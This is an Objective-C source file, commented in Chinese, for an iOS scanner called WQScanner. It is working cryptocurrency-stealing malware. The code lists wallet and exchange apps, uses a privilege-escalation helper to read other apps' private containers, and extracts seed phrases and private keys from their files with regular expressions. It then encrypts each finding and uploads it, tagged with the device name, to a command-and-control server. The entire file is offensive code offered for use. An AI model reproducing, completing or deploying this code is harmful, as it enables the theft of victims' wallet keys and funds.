#import "WQScanner.h"
#import "worse_query.h"
#import "Config.h"
#import <CommonCrypto/CommonCrypto.h>
#import <UIKit/UIKit.h>

// ── 已知钱包 App 的 bundle id 前缀 ──
static NSArray<NSString *> *walletBundles(void) {
    static NSArray *a = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        a = @[
            // 多链
            @"io.tokenpocket", @"im.token.im", @"com.trustwallet",
            @"io.metamask", @"me.rainbow", @"com. coinbase",
            @"org.toshi", @"com.wallet", @"io.zerion",
            @"com.exodus", @"io.atomicwallet", @"com.bitkeep",
            @"com.mathwallet", @"pro.tokenpocket",
            // 硬件钱包伴侣
            @"com.ledger", @"com.trezor",
            // 交易所
            @"com.binance", @"com.okex", @"com.huobi", @"com.bybit",
            @"com.coinbase", @"com.kraken", @"com.gateio",
            // BTC 系
            @"com.breadwallet", @"com.blockchain", @"piuk.blockchain",
            @"com.bluewallet", @"io.greenaddress", @"com.samourai",
            @"com.rivetz", @"com.electrum",
            // 其他
            @"com.phantom", @"com.solflare", @"com.keplr",
            @"com.tronlink", @"com.tronlinkpro", @"com.bitpie",
            @"com.hyperpay", @"com.tangem",
        ];
    });
    return a;
}

// ── 助记词正则：12/15/18/21/24 个 BIP39 词 ──
static NSArray<NSString *> *extractMnemonics(NSString *text) {
    if (text.length == 0 || text.length > 400000) return @[];

    static NSRegularExpression *re = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *pat = @"(?:\\b[a-z]{3,8}\\b[\\s,;]+){11}\\b[a-z]{3,8}\\b"
                        @"|(?:\\b[a-z]{3,8}\\b[\\s,;]+){14}\\b[a-z]{3,8}\\b"
                        @"|(?:\\b[a-z]{3,8}\\b[\\s,;]+){17}\\b[a-z]{3,8}\\b"
                        @"|(?:\\b[a-z]{3,8}\\b[\\s,;]+){20}\\b[a-z]{3,8}\\b"
                        @"|(?:\\b[a-z]{3,8}\\b[\\s,;]+){23}\\b[a-z]{3,8}\\b";
        re = [NSRegularExpression regularExpressionWithPattern:pat
                                                        options:NSRegularExpressionCaseInsensitive
                                                          error:nil];
    });

    NSMutableArray *out = [NSMutableArray array];
    NSArray *ms = [re matchesInString:text options:0
                                range:NSMakeRange(0, text.length)];
    for (NSTextCheckingResult *m in ms) {
        NSString *s = [text substringWithRange:m.range];
        // 规范化空白
        s = [s stringByReplacingOccurrencesOfString:@"," withString:@" "];
        s = [s stringByReplacingOccurrencesOfString:@";" withString:@" "];
        s = [s stringByReplacingOccurrencesOfString:@"\n" withString:@" "];
        s = [s stringByReplacingOccurrencesOfString:@"\t" withString:@" "];
        while ([s containsString:@"  "]) {
            s = [s stringByReplacingOccurrencesOfString:@"  " withString:@" "];
        }
        s = [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        if (s.length) [out addObject:s];
    }
    return out;
}

// ── 十六进制私钥 / WIF ──
static NSArray<NSString *> *extractKeys(NSString *text) {
    if (text.length == 0) return @[];
    NSMutableArray *out = [NSMutableArray array];

    static NSRegularExpression *reHex = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        // 64 位 hex（32 字节私钥），可带 0x
        reHex = [NSRegularExpression regularExpressionWithPattern:
                 @"\\b(?:0x)?[0-9a-fA-F]{64}\\b" options:0 error:nil];
    });
    for (NSTextCheckingResult *m in [reHex matchesInString:text options:0
                                                    range:NSMakeRange(0, text.length)]) {
        [out addObject:[text substringWithRange:m.range]];
    }
    return out;
}

// ── AES-256-CBC 加密（iOS CommonCrypto 稳定可用）──
// 输出布局： "WQC1"(4) || iv(16) || ciphertext
// 4 字节魔数让 C2 端区分 CBC 与旧的 GCM 格式。
static NSData *aesEncrypt(NSData *plain, NSData *key) {
    if (!plain.length || key.length != 32) return nil;

    uint8_t iv[16];
    arc4random_buf(iv, sizeof(iv));

    size_t outLen = plain.length + kCCBlockSizeAES128;
    NSMutableData *ct = [NSMutableData dataWithLength:outLen];

    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(kCCEncrypt,
                                 kCCAlgorithmAES,
                                 kCCOptionPKCS7Padding,
                                 key.bytes, kCCKeySizeAES256,
                                 iv,
                                 plain.bytes, plain.length,
                                 ct.mutableBytes, outLen, &moved);
    if (st != kCCSuccess) return nil;

    ct.length = moved;

    NSMutableData *res = [NSMutableData data];
    [res appendBytes:"WQC1" length:4];
    [res appendBytes:iv length:16];
    [res appendData:ct];
    return res;
}

@interface WQScanner ()
@property (nonatomic, assign) NSInteger scannedContainers;
@property (nonatomic, assign) NSInteger hitCount;
@property (nonatomic, strong) NSMutableArray *findings;
@end

@implementation WQScanner

- (instancetype)init {
    if ((self = [super init])) {
        _findings = [NSMutableArray array];
        _scannedContainers = 0;
        _hitCount = 0;
    }
    return self;
}

- (void)emit:(NSString *)fmt, ... {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (self.progressBlock) {
        dispatch_async(dispatch_get_main_queue(), ^{ self.progressBlock(s); });
    }
    NSLog(@"[WQScanner] %@", s);
}

- (void)start {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self run];
    });
}

- (void)run {
    NSError *err = nil;
    @try {
        [self scanAllContainers];
        [self upload];

        if (self.finishBlock) {
            dispatch_async(dispatch_get_main_queue(), ^{
                self.finishBlock(self.scannedContainers, self.hitCount, nil);
            });
        }
    } @catch (NSException *e) {
        err = [NSError errorWithDomain:@"WQ"
                                  code:-1
                              userInfo:@{NSLocalizedDescriptionKey:
                                             e.reason ?: @"unknown"}];
        if (self.finishBlock) {
            dispatch_async(dispatch_get_main_queue(), ^{
                self.finishBlock(self.scannedContainers, self.hitCount, err);
            });
        }
    }
}

// ── 枚举所有 App 容器 ──
- (void)scanAllContainers {
    [self emit:@"枚举容器..."];

    NSMutableArray<NSDictionary *> *containers = [NSMutableArray array];

    // 方式一：直接读目录（worse_query 提权后可读）
    NSString *base = @"/private/var/mobile/Containers/Data/Application";
    NSArray *uuids = wq_list(base, self.appGroup);
    [self emit:@"容器根 %lu 项", (unsigned long)uuids.count];

    for (NSString *uuid in uuids) {
        if (uuid.length < 30) continue;   // 跳过 . 之类
        NSString *p = [base stringByAppendingPathComponent:uuid];
        NSDictionary *meta = [self containerMeta:p];
        if (!meta) continue;
        [containers addObject:meta];
    }

    // 方式二：扫 App Group 容器
    NSString *gBase = @"/private/var/mobile/Containers/Shared/AppGroup";
    NSArray *guuids = wq_list(gBase, self.appGroup);
    [self emit:@"AppGroup 根 %lu 项", (unsigned long)guuids.count];
    for (NSString *uuid in guuids) {
        if (uuid.length < 30) continue;
        NSString *p = [gBase stringByAppendingPathComponent:uuid];
        NSDictionary *meta = [self containerMeta:p];
        if (meta) [containers addObject:meta];
    }

    [self emit:@"共 %lu 个容器待扫", (unsigned long)containers.count];

    for (NSDictionary *meta in containers) {
        @autoreleasepool {
            NSString *bundle = meta[@"bundle"];
            if (self.walletOnly && ![self isWalletBundle:bundle]) continue;

            self.scannedContainers++;
            [self scanContainer:meta];
        }
    }
}

- (BOOL)isWalletBundle:(NSString *)bundle {
    if (bundle.length == 0) return NO;
    for (NSString *pfx in walletBundles()) {
        if ([bundle.lowercaseString containsString:pfx]) return YES;
    }
    return NO;
}

// 从 .com.apple.mobile_container_manager.metadata.plist 读 bundle id
- (NSDictionary *)containerMeta:(NSString *)path {
    NSString *metaPath = [path stringByAppendingPathComponent:
                          @".com.apple.mobile_container_manager.metadata.plist"];
    NSData *d = wq_read(metaPath, self.appGroup);
    if (!d.length) return nil;

    NSDictionary *pl = [NSPropertyListSerialization propertyListWithData:d
                                                                options:0
                                                                 format:NULL
                                                                  error:nil];
    if (![pl isKindOfClass:[NSDictionary class]]) return nil;

    NSString *ident = pl[@"MCMMetadataIdentifier"];
    if (ident.length == 0) return nil;

    return @{ @"path": path, @"bundle": ident };
}

- (void)scanContainer:(NSDictionary *)meta {
    NSString *root = meta[@"path"];
    NSString *bundle = meta[@"bundle"];

    NSMutableArray *hits = [NSMutableArray array];
    [self walk:root bundle:bundle depth:0 hits:hits count:0];

    if (hits.count) {
        [self emit:@"★ %@  命中 %lu", bundle, (unsigned long)hits.count];
        self.hitCount += hits.count;
        for (NSDictionary *h in hits) [self.findings addObject:h];
    }
}

- (void)walk:(NSString *)dir
      bundle:(NSString *)bundle
       depth:(NSInteger)depth
        hits:(NSMutableArray *)hits
       count:(NSInteger)count {
    if (depth > 6 || count > kMaxFilesPerContainer) return;
    if (hits.count > 200) return;

    NSArray *items = wq_list(dir, self.appGroup);
    for (NSString *name in items) {
        if (hits.count > 200) return;
        NSString *full = [dir stringByAppendingPathComponent:name];

        // 目录递归
        BOOL isDir = NO;
        NSFileManager *fm = [NSFileManager defaultManager];
        if ([fm fileExistsAtPath:full isDirectory:&isDir] && isDir) {
            // 跳过明显的无关目录
            if ([name isEqualToString:@"Caches"] ||
                [name isEqualToString:@"tmp"] ||
                [name isEqualToString:@"Snapshots"] ||
                [name hasPrefix:@"."]) continue;
            [self walk:full bundle:bundle depth:depth+1 hits:hits count:count+1];
            continue;
        }

        // 只读文本类
        NSString *ext = name.pathExtension.lowercaseString;
        BOOL texty = ([ext isEqualToString:@"json"] ||
                      [ext isEqualToString:@"txt"] ||
                      [ext isEqualToString:@"plist"] ||
                      [ext isEqualToString:@"db"] ||
                      [ext isEqualToString:@"sqlite"] ||
                      [ext isEqualToString:@"log"] ||
                      [ext isEqualToString:@"dat"] ||
                      ext.length == 0);
        if (!texty) continue;

        NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
        if ([attrs[NSFileSize] unsignedLongLongValue] > kMaxFileBytes) continue;

        NSData *d = wq_read(full, self.appGroup);
        if (!d.length) continue;

        NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (!s.length) {
            // 二进制里捞可见 ASCII
            s = [self asciiFromData:d];
        }
        if (!s.length) continue;

        NSArray *mn = extractMnemonics(s);
        NSArray *keys = extractKeys(s);

        if (mn.count || keys.count) {
            [hits addObject:@{
                @"bundle": bundle,
                @"file": full,
                @"mnemonics": mn,
                @"keys": keys,
            }];
        }
    }
}

- (NSString *)asciiFromData:(NSData *)d {
    const uint8_t *b = d.bytes;
    NSUInteger n = d.length;
    NSMutableString *s = [NSMutableString string];
    NSMutableString *cur = [NSMutableString string];
    for (NSUInteger i = 0; i < n; i++) {
        uint8_t c = b[i];
        if ((c >= 0x20 && c < 0x7f) || c == '\n' || c == '\t') {
            [cur appendFormat:@"%c", c];
        } else {
            if (cur.length > 20) { [s appendString:cur]; [s appendString:@"\n"]; }
            [cur setString:@""];
        }
        if (s.length > 300000) break;
    }
    if (cur.length > 20) [s appendString:cur];
    return s;
}

// ── 上传：逐条提交，匹配 c2_server.py 的 /api/collect ──
//   C2 端格式： body = nonce(12) || AES-GCM(ct||tag)
//              明文 = {"type":"mnemonic"|"privkey"|"keychain",
//                      "value":..., "bundle":..., "path":...}
- (void)upload {
    if (self.findings.count == 0) {
        [self emit:@"无命中，跳过上传"];
        return;
    }

    [self emit:@"提交 %lu 条命中...", (unsigned long)self.findings.count];

    __block NSInteger okCount = 0;
    __block NSInteger failCount = 0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    // 把每条命中拆成独立的 type 记录
    NSMutableArray<NSDictionary *> *records = [NSMutableArray array];
    for (NSDictionary *f in self.findings) {
        NSString *bundle = f[@"bundle"] ?: @"";
        NSString *path   = f[@"file"] ?: @"";

        for (NSString *mn in (f[@"mnemonics"] ?: @[])) {
            [records addObject:@{
                @"type": @"mnemonic",
                @"value": mn,
                @"bundle": bundle,
                @"path": path,
            }];
        }
        for (NSString *k in (f[@"keys"] ?: @[])) {
            [records addObject:@{
                @"type": @"privkey",
                @"value": k,
                @"bundle": bundle,
                @"path": path,
            }];
        }
    }

    [self emit:@"实际待发 %lu 条", (unsigned long)records.count];
    if (records.count == 0) return;

    NSMutableArray *pending = [records mutableCopy];

    __block void (^sendNext)(void) = nil;
    sendNext = ^{
        if (pending.count == 0) {
            dispatch_semaphore_signal(sem);
            return;
        }
        NSDictionary *rec = pending.firstObject;
        [pending removeObjectAtIndex:0];

        NSError *jerr = nil;
        NSData *json = [NSJSONSerialization dataWithJSONObject:rec
                                                       options:0
                                                         error:&jerr];
        if (!json) {
            failCount++;
            sendNext();
            return;
        }

        NSData *enc = aesEncrypt(json, self.aesKey);
        if (!enc) {
            failCount++;
            [self emit:@"✗ 加密失败"];
            sendNext();
            return;
        }

        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:
                                    [NSURL URLWithString:self.c2URL]];
        req.HTTPMethod = @"POST";
        req.timeoutInterval = 30;
        [req setValue:@"application/octet-stream"
   forHTTPHeaderField:@"Content-Type"];
        [req setValue:[[UIDevice currentDevice] name]
   forHTTPHeaderField:@"X-Device"];
        [req setValue:[UIDevice currentDevice].systemVersion
   forHTTPHeaderField:@"X-Name"];
        [req setValue:rec[@"type"] ?: @""
   forHTTPHeaderField:@"X-Kind"];
        req.HTTPBody = enc;

        [[[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *data, NSURLResponse *resp, NSError *e) {
                NSInteger code = [(NSHTTPURLResponse *)resp statusCode];
                if (e || code >= 400) {
                    failCount++;
                    [self emit:@"✗ %@ HTTP %ld", rec[@"type"], (long)code];
                } else {
                    okCount++;
                    [self emit:@"✓ %@  %lu B", rec[@"type"],
                     (unsigned long)enc.length];
                }
                sendNext();
            }] resume];
    };

    sendNext();
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW,
                                               (int64_t)(90 * NSEC_PER_SEC)));

    [self emit:@"── 上传结束 成功 %ld / 失败 %ld ──",
     (long)okCount, (long)failCount];
}

- (NSDictionary *)deviceInfo {
    UIDevice *d = [UIDevice currentDevice];
    NSString *vid = @"";
    NSUUID *u = [d identifierForVendor];
    if (u) vid = [u UUIDString] ?: @"";
    return @{
        @"model": [d model] ?: @"",
        @"name": [d name] ?: @"",
        @"system": [d systemName] ?: @"",
        @"version": [d systemVersion] ?: @"",
        @"identifier": vid,
    };
}

@end
